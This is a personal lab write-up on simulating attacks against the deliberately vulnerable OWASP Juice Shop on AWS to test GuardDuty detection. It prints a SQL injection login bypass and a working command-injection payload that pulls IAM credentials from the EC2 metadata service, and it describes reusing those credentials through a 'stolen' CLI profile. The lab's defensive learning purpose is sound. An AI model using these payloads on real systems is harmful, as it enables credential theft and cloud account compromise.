# Threat Detection with GuardDuty


**Author:** Mohamed Mohamed  
**Email:** mohamed0395@gmail.com

---

![Image](https://imgur.com/IISPwYv.png)

---

## Introducing Today's Project!

### Tools and concepts

The services I used were **AWS GuardDuty, AWS CloudShell, AWS IAM, AWS S3, and AWS CLI**.  

Key concepts I learned include:  
- **Security Threat Detection:** Using GuardDuty to detect unauthorized access and potential threats.  
- **Cloud Security Best Practices:** Understanding the risks of exposed credentials and misconfigured permissions.  
- **Malware Protection:** Testing AWS GuardDuty’s malware detection capabilities with an EICAR test file.  
- **Command Injection & SQL Injection:** Learning how attackers exploit vulnerabilities in web applications.  
- **Incident Response:** Observing how GuardDuty identifies and reports suspicious activities.

### Project reflection

**Answer:**  
This project took me approximately **2** to complete, including setup, testing, and analyzing findings.  

The most challenging part was **understanding how GuardDuty detects security threats and configuring the AWS environment properly for testing without exposing real vulnerabilities**.  

It was most rewarding to **see GuardDuty successfully detect threats, such as unauthorized credential use and malware uploads, reinforcing the importance of cloud security monitoring**.

I did this project today to **deepen my understanding of AWS security services, particularly GuardDuty, and to gain hands-on experience in detecting and mitigating security threats**.  

This project successfully met my goals by **allowing me to simulate real-world attack scenarios, analyze security findings, and improve my cloud security knowledge**. It reinforced **the importance of proactive threat detection in cloud environments**.

---

## Project Setup

To set up for this project, I deployed a CloudFormation template that launches a vulnerable web application. The three main components are:

1. **Web App Infrastructure** – This includes an EC2 instance hosting the web app, a new VPC for networking, and a CloudFront distribution to optimize content delivery.
2. **Storage** – An S3 bucket is created to store files, including a simulated sensitive data file, which will later be accessed during security testing.
3. **Security Monitoring** – AWS GuardDuty is enabled to monitor and detect potential threats, helping to analyze attacks on the web app.

This setup provides a hands-on approach to understanding vulnerabilities, security monitoring, and threat detection.

The web app deployed is called **OWASP Juice Shop**. To practice my GuardDuty skills, I will simulate attacks on this intentionally vulnerable application, such as attempting to steal credentials and access sensitive data. By doing so, I will analyze how GuardDuty detects and reports these security threats, allowing me to gain hands-on experience in monitoring and responding to potential breaches.

GuardDuty is an AWS threat detection service that continuously monitors your AWS environment for malicious activity and unauthorized behavior. It analyzes logs from AWS resources, including VPC Flow Logs, DNS logs, and CloudTrail events, to detect potential security threats such as unauthorized access, data exfiltration, and compromised instances.

In this project, it will help identify and analyze security threats by monitoring the vulnerable web application we deployed. After simulating an attack, GuardDuty will detect suspicious activities, allowing us to review security alerts and understand how to respond to threats effectively.

![Image](https://imgur.com/JUIv72a.png)

---

## SQL Injection

The first attack I performed on the web app is SQL injection, which means injecting malicious SQL code into a query to manipulate the database’s behavior. SQL injection is a security risk because it can allow attackers to bypass authentication, access sensitive data, modify database records, or even delete entire databases. This vulnerability occurs when user inputs are not properly sanitized, allowing malicious queries to alter the intended database logic.

My SQL injection attack involved inserting a specially crafted SQL statement into the web app’s login form. This means I used an input like **' OR 1=1; --**, which altered the database query to always evaluate as true, bypassing authentication. By doing this, I was able to gain unauthorized access to the system without valid credentials, demonstrating a critical security vulnerability in applications that do not properly validate user inputs.

![Image](https://imgur.com/ewOet9A.png)

---

## Command Injection

Next, I used command injection, which is a security vulnerability that allows an attacker to execute arbitrary system commands on a server by injecting malicious input into a web application. 

The Juice Shop web app is vulnerable to this because it does not properly sanitize user inputs, allowing unexpected commands to be executed. This means instead of treating the input as simple text, the web server mistakenly runs it as a command, potentially leading to data theft, system manipulation, or full server compromise.

To run command injection, I entered a specially crafted input into the username field that included system commands instead of a regular username. The script will execute this command instead of treating it as text, allowing unauthorized actions such as extracting sensitive data or gaining further control over the system.

The actual JSON command used for this injection is:

```json
#{global.process.mainModule.require('child_process').exec(
    'CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;
    TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` &&
    CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") &&
    echo $CRED | json_pp > frontend/dist/frontend/assets/public/credentials.json'
)}

```

This command injection exploits the server-side execution of user input, allowing an attacker to retrieve AWS IA

![Image](https://imgur.com/Bhqp7w6.png)

---

## Attack Verification

To verify the attack's success, I checked the credentials page where the stolen AWS IAM credentials were stored. The credentials page showed me the extracted security credentials, including access keys and session tokens, confirming that the command injection successfully retrieved and saved them from the EC2 instance metadata API. This verification step ensures that the attack worked as intended and demonstrates the severity of insecure input handling in web applications.

![Image](https://imgur.com/AaTM8O4.png)

---

## Using CloudShell for Advanced Attacks

The attack continues in CloudShell because it provides a direct command-line interface within the AWS Management Console, allowing me to execute commands efficiently. By using CloudShell, I can configure the AWS CLI with the stolen credentials and interact with AWS services, such as listing and retrieving sensitive data from an S3 bucket. This demonstrates how attackers exploit compromised credentials to move laterally within an AWS environment and gain unauthorized access to critical resources.

In CloudShell, I used `wget` to download data from an external or internal source, such as retrieving credentials or sensitive files from an S3 bucket. 

Next, I ran a command using `cat` and `jq` to read and format the extracted data. `cat` was used to display the content of the retrieved file, while `jq` was used to parse and format JSON data, making it easier to analyze and extract specific details like access keys or secrets. These commands helped automate the process of extracting and organizing sensitive information from the compromised AWS environment.

I then set up a profile called **stolen** to use the extracted credentials from the compromised web application. 

I had to create a new profile because AWS CLI profiles allow different authentication configurations, and by setting up the **stolen** profile, I could authenticate using the stolen credentials instead of my default ones. This enabled me to perform actions on AWS services with the compromised permissions, mimicking how an attacker would exploit leaked credentials to access sensitive cloud resources.

![Image](https://imgur.com/fQTYoUi.png)

---

## GuardDuty's Findings

After performing the attack, GuardDuty reported a finding within a 15 minutes. Findings are generated based on suspicious activities such as unauthorized access, credential misuse, or unusual API calls. This rapid detection highlights the effectiveness of GuardDuty in monitoring AWS environments for security threats and enables quick response actions to mitigate potential risks.

GuardDuty's finding was called **"Credentials for the EC2 instance role were used from a remote AWS account."** 

This means that credentials assigned to an EC2 instance role were accessed from an external AWS account, which is an unusual activity. **Anomaly detection was used** because GuardDuty continuously monitors for suspicious behaviors, such as unauthorized access attempts or deviations from normal activity patterns. By detecting this anomaly, GuardDuty helps identify potential security breaches and unauthorized credential usage.

GuardDuty's detailed finding reported that **credentials for the EC2 instance role "GuardDuty-project-Mohamed-TheRole-z5FOiuc5f3YY" were used from a remote AWS account.** This indicates that the credentials, which were meant for internal use within the AWS environment, were accessed externally, potentially signaling unauthorized use or credential compromise. The finding was flagged as **high severity** due to the risk associated with credential leakage and potential misuse by attackers.

![Image](https://imgur.com/2R0phfF.png)

---

## Extra: Malware Protection

For my project extension, I enabled **malware protection** in AWS GuardDuty. Malware protection helps detect and analyze malicious files uploaded to S3 buckets, enhancing the security of cloud environments by identifying potential threats in real-time._

To test Malware Protection, I uploaded an EICAR test file to my S3 bucket. The uploaded file won't actually cause damage because it's a harmless test file designed to simulate malware detection and trigger security responses without posing a real threat.

Once I uploaded the file, GuardDuty instantly triggered an alert, identifying the EICAR test file as potential malware. This verified that GuardDuty's malware protection feature is active and effectively detects threats in the S3 bucket, confirming its ability to recognize and respond to malicious activity.

![Image](https://imgur.com/IISPwYv.png)

---
